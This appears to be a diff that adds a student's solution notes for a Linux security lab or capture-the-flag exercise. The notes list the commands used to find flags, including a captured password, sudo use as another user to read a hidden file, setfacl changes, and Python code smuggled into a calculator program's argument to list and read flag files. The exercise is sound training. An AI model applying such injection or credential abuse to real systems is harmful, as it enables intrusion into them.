@@ -1,0 +1,14 @@
+1) a) cat /etc/secret/flag
+1) b) for i in {1..10000}; do cat ".$i";done 2> /home/hacker/lol.txt
+1) c) giff-me-flag PLEASE!!!11oneone @ mihai (get string on hacker/student with strings)
+2) xaX4xaxa4444 password from decanu home folder
+Decanu, you are allowed use 'sudo' on my behalf to execute 'read-bank-accounts'! Use man if you don't know how to control its behavior, google, anything but don't bother me!
+sudo -u rekt0r ./read-bank-accounts ../../.not_for_your_eyes on decanu
+3) ./sant_calculator "123);import subprocess;  print(subprocess.run(['ls', '-l', '.flags'])"
+./sant_calculator "123);import subprocess;  print(subprocess.run(['cat', '.flags/whereisflagz0rx.txt'])"
+4) a) student@7c9ca91f47cd:~$ setfacl -m u:flagz0wner:rwx givemeflagz/
+student@7c9ca91f47cd:~$ setfacl -m u:an0th3r0n3:--- givemeflagz/
+student@7c9ca91f47cd:~$ setfacl -m u:dujm3n:--- givemeflagz/
+4) b)
+cat givemeflagz/second/lastflag2.txt
+
